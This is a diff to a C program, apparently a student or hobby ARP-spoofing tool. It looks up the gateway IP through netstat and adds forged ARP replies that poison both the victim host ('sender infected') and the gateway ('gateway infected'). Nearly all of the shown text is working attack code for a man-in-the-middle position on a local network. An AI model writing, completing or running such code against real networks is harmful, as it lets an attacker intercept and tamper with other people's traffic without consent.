@@ -115,7 +115,9 @@ int main(int argc, char *argv[]){
 
 	char senderMAC[18];
 	char targetMAC[18];
+	char gatewayMAC[18];
 	char myIP[16];
+	char gatewayIP[16];
 	
 	char bufff[256];
 	FILE *tempfp;
@@ -163,12 +165,22 @@ int main(int argc, char *argv[]){
 		//printf("%s", myIP);
 	}
 	pclose(tempfp);
-
+	
+	tempfp = popen("netstat -rn | grep 0.0.0.0 | sed -n 1p | awk '{print $2}'", "r");
+	if(tempfp == NULL){
+		perror("popen failed");
+		return -1;
+	}
+	while(fgets(gatewayIP, 17, tempfp) != NULL){
+		//printf("%s", gatewayIP);	
+	}
+	pclose(tempfp);
 	printf("Device : %s\n", dev);	//	print Interface Device
 	printf("sender IP Address : %s\n", senderIP);
 	printf("target IP Address : %s\n", targetIP);
 	printf("My MAC Adress : %s", senderMAC);
-	printf("My IP Address : %s\n", myIP);
+	printf("My IP Address : %s", myIP);
+	printf("Gateway IP Address : %s\n", gatewayIP);
 	if(dev == NULL){
 		fprintf(stderr, "Couldn't find default device : %s\n", errbuf);
 		return (2);
@@ -391,9 +403,11 @@ int main(int argc, char *argv[]){
 		//int sendArpReply(pcap_t *handle, struct pcap_pkthdr *header, char *senderMAC, char *senderIP, char *targetMAC, char *targetIP){
 		if(sendArpReply(handle, header, senderMAC, senderIP, targetMAC, targetIP) == -1){
 			printf("failed\n");
-		}
+		}	//	sender infected
 
-		if(sendArpReply(handle, header, senderMAC, targetIP, gatewayMAC, 
+		if(sendArpReply(handle, header, senderMAC, targetIP, gatewayMAC, gatewayIP) == -1){
+			printf("failed\n");
+		}	//	gateway infected
 			
 	}else{}
 	pcap_close(handle);
